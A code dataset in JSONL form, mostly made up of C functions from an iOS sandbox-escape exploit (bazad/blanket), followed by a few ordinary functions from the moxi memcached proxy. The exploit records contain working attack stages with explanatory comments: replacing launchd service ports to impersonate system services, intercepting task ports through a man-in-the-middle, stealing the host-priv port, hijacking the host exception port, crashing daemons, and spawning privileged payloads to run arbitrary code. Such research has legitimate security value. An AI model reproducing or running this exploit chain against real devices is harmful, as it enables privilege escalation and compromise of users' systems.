{"docstring": "// Destroy the file descriptors and file actions created with setup_stdio_fds().\n", "func_signal": "static void\ncleanup_stdio_fds(threadexec_t priv_tx, int *stdio_fds_r, const void *file_actions_r)", "code": "{\n\tif (file_actions_r != NULL) {\n\t\t// Close the remote file descriptors.\n\t\tfor (size_t i = 0; i < 3; i++) {\n\t\t\tif (stdio_fds_r[i] >= 0) {\n\t\t\t\tthreadexec_file_close(priv_tx, stdio_fds_r[i]);\n\t\t\t}\n\t\t}\n\t\t// Destroy the posix_spawn_file_actions_t.\n\t\tthreadexec_call_cv(priv_tx, NULL, 0,\n\t\t\t\tposix_spawn_file_actions_destroy, 1,\n\t\t\t\tTX_CARG_LITERAL(posix_spawn_file_actions_t *, file_actions_r));\n\t}\n}", "path": "blanket\\sandbox_escape\\spawn_privileged.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Exploit stage 2: Get the task port for an unsandboxed process, in this case the druid daemon.\n", "func_signal": "static bool\nget_druid_task(struct sandbox_escape_context *context)", "code": "{\n\t// Get a send right to the real com.apple.CARenderServer service.\n\tmach_port_t carenderserver = launchd_lookup_service(CARENDERSERVER_SERVICE_NAME);\n\tif (carenderserver == MACH_PORT_NULL) {\n\t\tERROR(\"Could not connect to %s\", CARENDERSERVER_NAME);\n\t\treturn false;\n\t}\n\tcontext->carenderserver_service = carenderserver;\n\t// Replace CARenderServer with our own fake service in launchd. If the port is freed the\n\t// system will be unstable.\n\tcontext->system_unstable = true;\n\tmach_port_t real_carenderserver, fake_carenderserver;\n\tbool ok = launchd_replace_service_port(CARENDERSERVER_SERVICE_NAME,\n\t\t\t&real_carenderserver, &fake_carenderserver);\n\tif (!ok) {\n\t\tERROR(\"Could not impersonate %s\", CARENDERSERVER_NAME);\n\t\treturn false;\n\t}\n\tcontext->fake_carenderserver_service = fake_carenderserver;\n\tassert(real_carenderserver == carenderserver);\n\tmach_port_deallocate(mach_task_self(), real_carenderserver);\n\tINFO(\"Impersonating %s!\", CARENDERSERVER_NAME);\n\t// Now fake_carenderserver will be sent to any processes that look up CARenderServer in\n\t// launchd. We need to start a thread to MITM that service so that we can inspect messages\n\t// for task ports. Here we create the context for the server, which will be shared only for\n\t// the duration of this function.\n\t__block struct {\n\t\tmach_port_t task_port;\n\t\tdispatch_semaphore_t have_task_port;\n\t} mitm_context;\n\tmitm_context.task_port = MACH_PORT_NULL;\n\tmitm_context.have_task_port = dispatch_semaphore_create(0);\n\tassert(mitm_context.have_task_port != NULL);\n\t// Start the MITM server in another thread. It will continue to run after this function has\n\t// returned, since we don't want to break the system. :) We will repair the damage at a\n\t// later point, once we have launchd's task port.\n\tdispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{\n\t\t// Run the MITM server until the fake_carenderserver port is destroyed.\n\t\tmach_mitm_server(carenderserver, fake_carenderserver,\n\t\t\t\t^bool (mach_msg_header_t *msg) {\n\t\t\tDEBUG_TRACE(2, \"New message 0x%x from PID %u\",\n\t\t\t\t\tmsg->msgh_id, mach_message_get_pid(msg));\n\t\t\t// We have a new message on the fake_carenderserver port. If the task_port\n\t\t\t// slot is empty, try to fill it with a task port from the message.\n\t\t\tif (mitm_context.task_port == MACH_PORT_NULL) {\n\t\t\t\t// Search the message for task ports.\n\t\t\t\t__block mach_port_t task = MACH_PORT_NULL;\n\t\t\t\tmach_message_inspect_ports(msg, ^bool (mach_port_t port) {\n\t\t\t\t\tif (task_is_unsandboxed(port)) {\n\t\t\t\t\t\ttask = port;\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t\treturn false;\n\t\t\t\t});\n\t\t\t\t// If we found a task, add a reference to it (since sending will\n\t\t\t\t// remove a reference), store it in the MITM context for retrieval,\n\t\t\t\t// and signal the semaphore.\n\t\t\t\tif (task != MACH_PORT_NULL) {\n\t\t\t\t\tkern_return_t kr = mach_port_mod_refs(mach_task_self(),\n\t\t\t\t\t\t\ttask, MACH_PORT_RIGHT_SEND, 1);\n\t\t\t\t\tassert(kr == KERN_SUCCESS);\n\t\t\t\t\tmitm_context.task_port = task;\n\t\t\t\t\tdispatch_semaphore_signal(mitm_context.have_task_port);\n\t\t\t\t}\n\t\t\t}\n\t\t\t// Forward the message.\n\t\t\treturn true;\n\t\t});\n\t\t// By the time we exit the MITM server the fake service port has been destroyed, so\n\t\t// no one else has a reference to the MITM context. Release the task port and free\n\t\t// the semaphore.\n\t\tDEBUG_TRACE(1, \"Exiting MITM server\");\n\t\tmach_port_deallocate(mach_task_self(), mitm_context.task_port);\n\t\tdispatch_release(mitm_context.have_task_port);\n\t});\n\t// Ok, now any program that starts up and sends its task port to CARenderServer will\n\t// instead send its task port to us. However, we won't get the task port unless the program\n\t// freshly starts up. We are targeting druid, the drag UI daemon, which may already be\n\t// running. Thus, we will try twice: if we don't get the task port after a few seconds, we\n\t// will restart druid.\n\tstart_druid();\n\tlong result = dispatch_semaphore_wait(mitm_context.have_task_port,\n\t\t\tdispatch_time(DISPATCH_TIME_NOW, 4 * NSEC_PER_SEC));\n\tif (result == 0) {\n\t\tgoto got_task;\n\t}\n\t// We didn't get it the first time, so maybe druid was already running. Restart it and try\n\t// again.\n\tINFO(\"Crashing and restarting %s\", DRUID_NAME);\n\tcrash_druid();\n\tstart_druid();\n\tresult = dispatch_semaphore_wait(mitm_context.have_task_port,\n\t\t\tdispatch_time(DISPATCH_TIME_NOW, 12 * NSEC_PER_SEC));\n\tif (result != 0) {\n\t\tERROR(\"Timed out while trying to get task port for %s\", DRUID_NAME);\n\t\treturn false;\n\t}\n\t// Alright, we got the task port! Set the task port in the MITM context to MACH_PORT_DEAD\n\t// so that the MITM server doesn't search for more ports.\ngot_task:\n\tINFO(\"Got task port for %s! 0x%x\", DRUID_NAME, mitm_context.task_port);\n\tcontext->druid_task = mitm_context.task_port;\n\tmitm_context.task_port = MACH_PORT_DEAD;\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Start the druid daemon, printing a warning on failure.\n", "func_signal": "static void\nstart_druid()", "code": "{\n\tbool ok = druid_start();\n\tif (!ok) {\n\t\tWARNING(\"Could not start %s\", DRUID_NAME);\n\t}\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Restore the launchd service port that was replaced by the exploit.\n", "func_signal": "static bool\nrestore_launchd_service(threadexec_t threadexec, mach_port_t launchd_task_remote,\n\t\tconst char *service_name, mach_port_t *fake_service, mach_port_t real_service,\n\t\tunsigned srcount)", "code": "{\n\t// Our strategy is as follows: First we find launchd's name for the fake service port. Then\n\t// we deallocate that port in launchd's task and insert the correct port back into launchd\n\t// using the same name.\n\tmach_port_t service_port_name;\n\tbool ok = threadexec_task_get_send_right_name(threadexec, launchd_task_remote,\n\t\t\t*fake_service, &service_port_name);\n\tif (!ok) {\n\t\treturn false;\n\t}\n\tDEBUG_TRACE(2, \"Launchd port name for %s: 0x%x\", service_name, service_port_name);\n\t// Launchd services tend to have 2 send references.\n\tok = restore_launchd_send_right(threadexec, launchd_task_remote,\n\t\t\tservice_port_name, fake_service, real_service, srcount);\n\tif (!ok) {\n\t\treturn false;\n\t}\n\t// Finally check that looking up the service gives the original service port.\n\tmach_port_t new_service = launchd_lookup_service(service_name);\n\tmach_port_deallocate(mach_task_self(), new_service);\n\tif (new_service != real_service) {\n\t\tERROR(\"Failed to replace launchd service port for %s\", service_name);\n\t\tDEBUG_TRACE(1, \"Real service is 0x%x, fake service is 0x%x, \"\n\t\t\t\t\"after replacement we have 0x%x\",\n\t\t\t\treal_service, *fake_service, new_service);\n\t}\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// The request structure for mach_exception_raise_state_identity.\n", "func_signal": "typedef struct __attribute__((packed))", "code": "{\n\tmach_msg_header_t          hdr;\n\tmach_msg_body_t            body;\n\tmach_msg_port_descriptor_t thread;\n\tmach_msg_port_descriptor_t task;\n\tNDR_record_t               NDR;\n\tuint32_t                   exception;\n\tuint32_t                   codeCnt;\n\tint64_t                    code[2];\n\tint32_t                    flavor;\n\tuint32_t                   old_stateCnt;\n\tuint32_t                   old_state[THREAD_STATE_MAX];\n}", "path": "blanket\\reportcrash\\reportcrash.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Aaaaand putting it all together...\n", "func_signal": "threadexec_t\nsandbox_escape()", "code": "{\n\tDEBUG_TRACE(1, \"%s\", __func__);\n\tstruct sandbox_escape_context context = {};\n\t// The first step is to get the host-priv port using launchd-portrep. This is the safest\n\t// part of the exploit since we'll replace com.apple.ReportCrash.SafetyNet, which is not\n\t// meaningfully used. We also get the fake service port and the keepalive assertion on\n\t// SafetyNet, since we don't want it to die until after we've fixed its port in launchd.\n\tbool ok = get_host_priv(&context);\n\tif (!ok) {\n\t\tgoto fail;\n\t}\n\t// The next step is to use the launchd-portrep vulnerability again to get the task port for\n\t// an unsandboxed process (at any privilege level). We'll target druid, the DragUI daemon,\n\t// which is unsandboxed and runs as the user mobile. druid sends its task port to the\n\t// com.apple.CARenderServer service, which is run by backboardd.\n\tok = get_druid_task(&context);\n\tif (!ok) {\n\t\tgoto fail;\n\t}\n\t// We now have an unsandboxed task and the host-priv port, so the natural next step is to\n\t// combine them! We'll use threadexec to insert the host-priv port into the unsandboxed\n\t// task and set the host exception port for EXC_BAD_ACCESS.\n\tok = set_host_exception_port(&context);\n\tif (!ok) {\n\t\tgoto fail;\n\t}\n\t// Now any process that crashes with EXC_BAD_ACCESS (and also doesn't have a thread/task\n\t// exception handler, which is most processes) will send us its task and thread port! Let's\n\t// crash ReportCrash (again). This time ReportCrash won't be suspended, so we can actually\n\t// use the task and thread ports to execute code.\n\tok = get_reportcrash_task(&context);\n\tif (!ok) {\n\t\tgoto fail;\n\t}\n\t// Restore the host's EXC_BAD_ACCESS exception port, since we now have a task port for a\n\t// process with the task_for_pid-allow entitlement.\n\trestore_host_exception_port(&context);\n\t// Use ReportCrash to fix up the exploit damage.\n\tok = fix_exploit_damage(&context);\n\tif (!ok) {\n\t\t// We may have obtained an execution context but failed to fix launchd. The system\n\t\t// is likely to be unstable, but continue anyway.\n\t\tERROR(\"Failed to fix the damage caused by the exploit\");\n\t}\n\t// Now we can use ReportCrash to execute arbitrary code with the task_for_pid-allow\n\t// entitlement. ;)\nfail:\n\tclear_context(&context);\n\tif (context.system_unstable) {\n\t\tERROR(\"The system is likely to be unstable\");\n\t}\n\tDEBUG_TRACE(1, \"%s: done\", __func__);\n\treturn context.reportcrash_tx;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// The reply structure for mach_exception_raise_state_identity.\n", "func_signal": "typedef struct __attribute__((packed))", "code": "{\n\tmach_msg_header_t        hdr;\n\tNDR_record_t             NDR;\n\tkern_return_t            RetCode;\n\tint32_t                  flavor;\n\tmach_msg_type_number_t   new_stateCnt;\n\tuint32_t                 new_state[THREAD_STATE_MAX];\n\tmach_msg_audit_trailer_t trailer;\n}", "path": "blanket\\reportcrash\\reportcrash.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Send a mach_exception_raise_state_identity message to the ReportCrash service, optionally\n// waiting for a reply.\n//\n// Note that due to the peculiar implementation of ReportCrash, this is the only Mach message that\n// we can send that will keep the process alive; any other message will cause ReportCrash to leave\n// the Mach message processing loop and eventually exit.\n", "func_signal": "static bool\nreportcrash_send_mach_exception_raise_state_identity(\n\t\tmach_port_t reportcrash_service,\n\t\tmach_port_t thread_port,\n\t\tmach_port_t task_port,\n\t\texception_type_t exception,\n\t\tvoid (^handle_reply)(mach_msg_header_t *))", "code": "{\n\t// We will send a Mach message to launchd that triggers the\n\t// mach_exception_raise_state_identity MIG service routine in ReportCrash. This service\n\t// routine, which is exposed over the \"com.apple.ReportCrash\" and\n\t// \"com.apple.ReportCrash.SafetyNet\" endpoints, also improperly calls\n\t// mach_port_deallocate() on the supplied task and thread ports, although we are not trying\n\t// to exploit this vulnerability.\n\tmach_port_t reply_port     = MACH_PORT_NULL;\n\tmach_msg_bits_t reply_type = 0;\n\tmach_msg_option_t options  = MACH_SEND_MSG;\n\tkern_return_t kr;\n\t// We only ask for a reply from ReportCrash if our caller has a handler for it.\n\tif (handle_reply != NULL) {\n\t\treply_port  = mig_get_reply_port();\n\t\treply_type  = MACH_MSG_TYPE_MAKE_SEND_ONCE;\n\t\toptions    |= MACH_RCV_MSG\n\t\t           |  MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)\n\t\t           |  MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);\n\t}\n\t// Create a buffer to hold the messages.\n\ttypedef union {\n\t\tRequest__mach_exception_raise_state_identity_t in;\n\t\tReply__mach_exception_raise_state_identity_t   out;\n\t} Message;\n\tMessage msg = {};\n\t// Populate the message.\n\tmsg.in.hdr.msgh_bits              = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, reply_type, 0, MACH_MSGH_BITS_COMPLEX);\n\tmsg.in.hdr.msgh_size              = sizeof(msg.in);\n\tmsg.in.hdr.msgh_remote_port       = reportcrash_service;\n\tmsg.in.hdr.msgh_local_port        = reply_port;\n\tmsg.in.hdr.msgh_id                = MACH_EXCEPTION_RAISE_STATE_IDENTITY;\n\tmsg.in.body.msgh_descriptor_count = 2;\n\tmsg.in.thread.name                = thread_port;\n\tmsg.in.thread.disposition         = MACH_MSG_TYPE_COPY_SEND;\n\tmsg.in.thread.type                = MACH_MSG_PORT_DESCRIPTOR;\n\tmsg.in.task.name                  = task_port;\n\tmsg.in.task.disposition           = MACH_MSG_TYPE_COPY_SEND;\n\tmsg.in.task.type                  = MACH_MSG_PORT_DESCRIPTOR;\n\tmsg.in.exception                  = exception;\n\tmsg.in.codeCnt                    = 2;\n\tmsg.in.code[0]                    = 0;\n\tmsg.in.code[1]                    = 0;\n\tmsg.in.flavor                     = ARM_THREAD_STATE64;\n\tmsg.in.old_stateCnt               = THREAD_STATE_MAX;\n\t// Send the message to ReportCrash. Also, silence the \"taking address of packed member\"\n\t// warning since it's incorrect here.\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Waddress-of-packed-member\"\n\tkr = mach_msg(&msg.in.hdr,\n\t\t\toptions,\n\t\t\tmsg.in.hdr.msgh_size,\n\t\t\tsizeof(msg.out),\n\t\t\treply_port,\n\t\t\tMACH_MSG_TIMEOUT_NONE,\n\t\t\tMACH_PORT_NULL);\n\tif (kr != KERN_SUCCESS) {\n\t\tERROR(\"%s: 0x%x\", \"mach_msg\", kr);\n\t\treturn false;\n\t}\n\t// Give the message to the reply handler.\n\tif (handle_reply != NULL) {\n\t\thandle_reply(&msg.out.hdr);\n\t}\n#pragma clang diagnostic pop\n\treturn true;\n}", "path": "blanket\\reportcrash\\reportcrash.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Call chmod() on the payload so that it is executable.\n", "func_signal": "static bool\nmake_payload_executable(threadexec_t priv_tx, const char *path)", "code": "{\n\tint err;\n\tbool ok = threadexec_call_cv(priv_tx, &err, sizeof(err),\n\t\t\tchmod, 2,\n\t\t\tTX_CARG_CSTRING(const char *, path),\n\t\t\tTX_CARG_LITERAL(mode_t, 0755));\n\tif (!ok || err != 0) {\n\t\tWARNING(\"Could not make %s executable\", path);\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\spawn_privileged.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Crash the druid daemon, printing a warning on failure.\n", "func_signal": "static void\ncrash_druid()", "code": "{\n\tbool ok = druid_crash();\n\tif (!ok) {\n\t\tWARNING(\"Could not crash %s\", DRUID_NAME);\n\t}\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Clean up all resources from the exploit.\n", "func_signal": "static void\nclear_context(struct sandbox_escape_context *context)", "code": "{\n\t// Clear state from get_reportcrash_task().\n\tif (context->reportcrash_tx == NULL) {\n\t\tthread_resume(context->reportcrash_thread);\n\t\tmach_port_deallocate(mach_task_self(), context->reportcrash_task);\n\t\tmach_port_deallocate(mach_task_self(), context->reportcrash_thread);\n\t}\n\t// Clear state from set_host_exception_port().\n\tif (context->new_host_exception_handler_installed) {\n\t\trestore_host_exception_port(context);\n\t}\n\tif (context->druid_tx != NULL) {\n\t\tthreadexec_deinit(context->druid_tx);\n\t}\n\tmach_port_destroy(mach_task_self(), context->new_host_exception_handler);\n\tmach_port_deallocate(mach_task_self(), context->host_exception_handler);\n\t// Clear state from get_druid_task().\n\tmach_port_deallocate(mach_task_self(), context->druid_task);\n\tmach_port_destroy(mach_task_self(), context->fake_carenderserver_service);\n\tmach_port_deallocate(mach_task_self(), context->carenderserver_service);\n\t// Clear state from get_host_priv().\n\tmach_port_deallocate(mach_task_self(), context->host_priv);\n\tmach_port_destroy(mach_task_self(), context->fake_safetynet_service);\n\tif (context->safetynet_assertion != 0) {\n\t\treportcrash_keepalive_assertion_release(context->safetynet_assertion);\n\t}\n\tmach_port_deallocate(mach_task_self(), context->safetynet_service);\n\tmach_port_deallocate(mach_task_self(), context->reportcrash_service);\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Exploit stage 1: Get the host-priv port by impersonating ReportCrash.SafetyNet and then crashing\n// ReportCrash.\n", "func_signal": "static bool\nget_host_priv(struct sandbox_escape_context *context)", "code": "{\n\t// Get send rights to the ReportCrash and ReportCrash.SafetyNet services.\n\tmach_port_t reportcrash = launchd_lookup_service(REPORTCRASH_SERVICE_NAME);\n\tif (reportcrash == MACH_PORT_NULL) {\n\t\tERROR(\"Could not connect to %s\", REPORTCRASH_NAME);\n\t\treturn false;\n\t}\n\tcontext->reportcrash_service = reportcrash;\n\tmach_port_t safetynet = launchd_lookup_service(REPORTCRASH_SAFETYNET_SERVICE_NAME);\n\tif (safetynet == MACH_PORT_NULL) {\n\t\tERROR(\"Could not connect to %s\", SAFETYNET_NAME);\n\t\treturn false;\n\t}\n\tcontext->safetynet_service = safetynet;\n\tDEBUG_TRACE(1, \"ReportCrash = 0x%x, SafetyNet = 0x%x\", reportcrash, safetynet);\n\t// Keep SafetyNet alive and kickstart it to ensure it's running. We need to be sure that\n\t// launchd has given away its receive right to the SafetyNet service port before we can\n\t// proceed with the port replacement.\n\treportcrash_keepalive_assertion_t safetynet_assertion = reportcrash_keepalive(safetynet);\n\tif (safetynet_assertion == 0) {\n\t\tERROR(\"Could not generate a keepalive assertion for %s\", SAFETYNET_NAME);\n\t\treturn false;\n\t}\n\tcontext->safetynet_assertion = safetynet_assertion;\n\tbool ok = reportcrash_kickstart(safetynet, NULL);\n\tif (!ok) {\n\t\tWARNING(\"Could not kickstart %s\", SAFETYNET_NAME);\n\t}\n\t// Replace SafetyNet with our own fake service in launchd.\n\tmach_port_t real_safetynet, fake_safetynet;\n\tok = launchd_replace_service_port(REPORTCRASH_SAFETYNET_SERVICE_NAME,\n\t\t\t&real_safetynet, &fake_safetynet);\n\tif (!ok) {\n\t\tERROR(\"Could not impersonate %s\", SAFETYNET_NAME);\n\t\treturn false;\n\t}\n\tcontext->fake_safetynet_service = fake_safetynet;\n\tassert(real_safetynet == safetynet);\n\tmach_port_deallocate(mach_task_self(), real_safetynet);\n\tINFO(\"Impersonating %s!\", SAFETYNET_NAME);\n\t// Ok, now any instance of ReportCrash that starts up and crashes will send us its task\n\t// port. Existing instances, however, will continue to send exception messages to the real\n\t// SafetyNet. And ReportCrash is likely to be running because of launchd_portrep_crasher.\n\t// So, force ReportCrash to exit so that it starts up again and launchd sends it our fake\n\t// SafetyNet port.\n\tok = reportcrash_exit(reportcrash);\n\tif (!ok) {\n\t\tWARNING(\"Could not exit %s\", REPORTCRASH_NAME);\n\t}\n\t// Send another message to cause ReportCrash to crash, triggering the exception message.\n\t// Note that due to how ReportCrash configures its exception handlers, we will only get\n\t// ReportCrash's task port once it's already in EXC_CRASH, not when the original\n\t// EXC_BAD_ACCESS exception is generated.\n\tINFO(\"Crashing %s\", REPORTCRASH_NAME);\n\tok = reportcrash_crash(reportcrash, false);\n\tif (!ok) {\n\t\tWARNING(\"Could not crash %s\", REPORTCRASH_NAME);\n\t}\n\t// Now listen for the exception message from the kernel containing ReportCrash's task port.\n\t// ReportCrash will be kept alive but suspended until we reply (implicitly, at the end of\n\t// this block).\n\tok = catch_exception_server(fake_safetynet, 30 * NSEC_PER_SEC, ^bool (\n\t\t\t\tmach_port_t            thread,\n\t\t\t\tmach_port_t            task,\n\t\t\t\texception_type_t       exception,\n\t\t\t\texception_data_t       code,\n\t\t\t\tmach_msg_type_number_t codeCnt,\n\t\t\t\tkern_return_t *        result) {\n\t\t// We have an exception message containing a task port. Almost certainly this is\n\t\t// ReportCrash. Extract the host-priv port and reply with KERN_FAILURE.\n\t\tcontext->host_priv = task_extract_host_priv(task);\n\t\t*result = KERN_FAILURE;\n\t\t// Don't process any more blocks.\n\t\treturn true;\n\t});\n\t// Handle a timeout.\n\tif (!ok) {\n\t\tERROR(\"Timed out while listening for exception message on our fake %s port\",\n\t\t\t\tSAFETYNET_NAME);\n\t\treturn false;\n\t}\n\t// Check if we got the host-priv port.\n\tif (context->host_priv == MACH_PORT_NULL) {\n\t\tERROR(\"Could not get the host-priv port\");\n\t\treturn false;\n\t}\n\t// Alright, we have the host-priv port!\n\tINFO(\"Got host-priv port 0x%x!\", context->host_priv);\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Build the argv and envp arrays.\n", "func_signal": "static bool\nbuild_argv_and_envp(threadexec_t priv_tx, const char *path,\n\t\tconst char **argv, const char **envp,\n\t\tconst void **path_r, const void **argv_r, const void **envp_r)", "code": "{\n\t// We will lay out the path/argv/envp entries like this:\n\t//\n\t// +------+------+------+---------+-----+---------+---------+-----+---------+\n\t// | argv | envp | path | argv[0] | ... | argv[n] | envp[0] | ... | envp[m] |\n\t// +------+------+------+---------+-----+---------+---------+-----+---------+\n\t//\n\t// First calculate the size of the payload.\n\tsize_t size = 0;\n\tsize_t argv_count, envp_count;\n\tsize_t path_size, argv_size, envp_size;\n\tpath_size = strlen(path) + 1;\n\tsize += path_size;\n\tfor (argv_count = 0; argv[argv_count] != NULL; argv_count++) {\n\t\tsize += strlen(argv[argv_count]) + 1;\n\t}\n\targv_size = (argv_count + 1) * sizeof(const char *);\n\tsize += argv_size;\n\tfor (envp_count = 0; envp[envp_count] != NULL; envp_count++) {\n\t\tsize += strlen(envp[envp_count]) + 1;\n\t}\n\tenvp_size = (envp_count + 1) * sizeof(const char *);\n\tsize += envp_size;\n\t// Check that this size is reasonable.\n\tif (size > 0x7000) {\n\t\tERROR(\"Arguments and environment too large\");\n\t\treturn false;\n\t}\n\t// Get the default shared vm region.\n\tuint8_t *memory_R;\n\tuint8_t *memory_L;\n\tthreadexec_shared_vm_default(priv_tx,\n\t\t\t(const void **)&memory_R, (void **)&memory_L, NULL);\n\t// Create pointers to argv, envp, path, and the strings array.\n\tchar **argv_L    = (void *)(memory_L);\n\tuint8_t *argv_R  = memory_R;\n\tchar **envp_L    = (void *)((uint8_t *)argv_L + argv_size);\n\tuint8_t *envp_R  = argv_R + argv_size;\n\tchar *path_L     = (void *)((uint8_t *)envp_L + envp_size);\n\tuint8_t *path_R  = envp_R + envp_size;\n\tchar *strings_L  = (void *)((uint8_t *)path_L + path_size);\n\tchar *strings_R  = (void *)(path_R + path_size);\n\t// Fill in the path.\n\tmemcpy(path_L, path, path_size);\n\t// Fill in the argv array and its strings.\n\tfor (size_t i = 0; i < argv_count; i++) {\n\t\targv_L[i] = strings_R;\n\t\tsize_t arg_size = strlen(argv[i]) + 1;\n\t\tmemcpy(strings_L, argv[i], arg_size);\n\t\tstrings_L += arg_size;\n\t\tstrings_R += arg_size;\n\t}\n\t// Fill in the envp array and its strings.\n\tfor (size_t i = 0; i < envp_count; i++) {\n\t\tenvp_L[i] = strings_R;\n\t\tsize_t arg_size = strlen(envp[i]) + 1;\n\t\tmemcpy(strings_L, envp[i], arg_size);\n\t\tstrings_L += arg_size;\n\t\tstrings_R += arg_size;\n\t}\n\t// That's it!\n\t*path_r = path_R;\n\t*argv_r = argv_R;\n\t*envp_r = envp_R;\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\spawn_privileged.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "// Check if the specified port represents an unsandboxed task.\n", "func_signal": "static bool\ntask_is_unsandboxed(mach_port_t task)", "code": "{\n\t// First check if this is a task.\n\tint pid = -1;\n\tpid_for_task(task, &pid);\n\tif (pid < 0) {\n\t\treturn false;\n\t}\n\t// It is a task! Now check if it is unsandboxed.\n\tint ret = sandbox_check(pid, NULL, 0);\n\tif (ret != 0) {\n\t\treturn false;\n\t}\n\t// It is unsandboxed!\n\treturn true;\n}", "path": "blanket\\sandbox_escape\\sandbox_escape.c", "repo_name": "bazad/blanket", "stars": 243, "license": "None", "language": "c", "size": 137}
{"docstring": "/*\n * Returns an item if it hasn't been marked as expired,\n * lazy-expiring as needed.\n */\n", "func_signal": "item *item_get(const char *key, const size_t nkey)", "code": "{\n    item *it;\n    pthread_mutex_lock(&cache_lock);\n    it = do_item_get(key, nkey);\n    pthread_mutex_unlock(&cache_lock);\n    return it;\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Frees a connection queue item (adds it to the freelist.)\n */\n", "func_signal": "static void cqi_free(CQ_ITEM *cq_item)", "code": "{\n    pthread_mutex_lock(&cqi_freelist_lock);\n    cq_item->next = cqi_freelist;\n    cqi_freelist = cq_item;\n    pthread_mutex_unlock(&cqi_freelist_lock);\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/* Do the actual work of forwarding the command from an\n * upstream ascii conn to its assigned binary downstream.\n */\n", "func_signal": "bool cproxy_forward_a2b_downstream(downstream *d)", "code": "{\n    assert(d != NULL);\n\n    conn *uc = d->upstream_conn;\n\n    assert(uc != NULL);\n    assert(uc->state == conn_pause);\n    assert(uc->cmd_start != NULL);\n    assert(uc->thread != NULL);\n    assert(uc->thread->base != NULL);\n    assert(IS_ASCII(uc->protocol));\n    assert(IS_PROXY(uc->protocol));\n\n    int server_index = -1;\n\n    if (cproxy_is_broadcast_cmd(uc->cmd_curr) == false) {\n        char *key = NULL;\n        int   key_len = 0;\n\n        if (ascii_scan_key(uc->cmd_start, &key, &key_len) &&\n            key != NULL &&\n            key_len > 0) {\n            server_index = cproxy_server_index(d, key, key_len, NULL);\n        }\n    }\n\n    int nc = cproxy_connect_downstream(d, uc->thread, server_index);\n    if (nc == -1) {\n        return true;\n    }\n\n    if (nc > 0) {\n        assert(d->downstream_conns != NULL);\n\n        if (d->usec_start == 0 &&\n            d->ptd->behavior_pool.base.time_stats) {\n            d->usec_start = usec_now();\n        }\n\n        if (uc->cmd == -1) {\n            return cproxy_forward_a2b_simple_downstream(d, uc->cmd_start, uc);\n        } else {\n            return cproxy_forward_a2b_item_downstream(d, uc->cmd, uc->item, uc);\n        }\n    }\n\n    return false;\n}", "path": "cproxy_protocol_a2b.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Decrements the reference count on an item and adds it to the freelist if\n * needed.\n */\n", "func_signal": "void item_remove(item *cq_item)", "code": "{\n#ifdef MOXI_ITEM_MALLOC\n    // Skip past the lock, since we're using malloc.\n    do_item_remove(cq_item);\n#else\n    pthread_mutex_lock(&cache_lock);\n    do_item_remove(cq_item);\n    pthread_mutex_unlock(&cache_lock);\n#endif\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Stores an item in the cache (high level, obeys set/add/replace semantics)\n */\n", "func_signal": "enum store_item_type store_item(item *cq_item, int comm, conn* c)", "code": "{\n    enum store_item_type ret;\n\n    pthread_mutex_lock(&cache_lock);\n    ret = do_store_item(cq_item, comm, c);\n    pthread_mutex_unlock(&cache_lock);\n    return ret;\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
{"docstring": "/*\n * Sets whether or not we accept new connections.\n */\n", "func_signal": "void accept_new_conns(const bool do_accept)", "code": "{\n    pthread_mutex_lock(&conn_lock);\n    do_accept_new_conns(do_accept);\n    pthread_mutex_unlock(&conn_lock);\n}", "path": "thread.c", "repo_name": "steveyen/moxi", "stars": 136, "license": "bsd-3-clause", "language": "c", "size": 12776}
